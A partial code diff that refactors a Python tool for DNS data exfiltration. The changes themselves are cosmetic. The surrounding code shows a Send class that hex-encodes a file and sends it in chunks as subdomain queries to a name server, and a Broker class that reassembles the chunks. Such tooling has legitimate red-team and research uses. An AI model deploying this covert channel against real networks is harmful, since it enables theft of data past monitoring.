@@ -96,22 +96,22 @@ def decode_dns_message(message):
     offset = DNS_QUERY_MESSAGE_HEADER.size
     questions, offset = decode_question_section(message, offset, qdcount)
 
-    result = {"id": id,
-              "is_response": qr,
-              "opcode": opcode,
-              "is_authoritative": aa,
-              "is_truncated": tc,
-              "recursion_desired": rd,
-              "recursion_available": ra,
-              "reserved": z,
-              "response_code": rcode,
-              "question_count": qdcount,
-              "answer_count": ancount,
-              "authority_count": nscount,
-              "additional_count": arcount,
-              "questions": questions}
-
-    return result
+    return {
+        "id": id,
+        "is_response": qr,
+        "opcode": opcode,
+        "is_authoritative": aa,
+        "is_truncated": tc,
+        "recursion_desired": rd,
+        "recursion_available": ra,
+        "reserved": z,
+        "response_code": rcode,
+        "question_count": qdcount,
+        "answer_count": ancount,
+        "authority_count": nscount,
+        "additional_count": arcount,
+        "questions": questions,
+    }
 
 
 class Send:
@@ -128,9 +128,8 @@ class Send:
     def _load_data(self):
         self.data = ""
         try:
-            f = open(self.file_path, 'rb')
-            data = f.read()
-            f.close()
+            with open(self.file_path, 'rb') as f:
+                data = f.read()
         except Exception as e:
             sys.stderr.write("Could not read file.\n")
             sys.stderr.write("Error: %s.\n" % e )
@@ -147,7 +146,7 @@ class Send:
         exfiltrate_this = _split_every_n(data_as_hex, PACKET_MAX_SIZE)
 
         for item in exfiltrate_this:
-            _send_packet('%s.%s' % (item, self.name_server))
+            _send_packet(f'{item}.{self.name_server}')
 
         return True
 
@@ -173,10 +172,7 @@ class Broker:
                     self.raw_compiled.append(dns_decoded['questions'][0])
         except KeyboardInterrupt as e:
             sys.stdout.write("Compiling...")
-            j = ''
-            for i in self.raw_compiled:
-                j += i
-
+            j = ''.join(self.raw_compiled)
             try:
                 data = binascii.unhexlify(j)
             except:
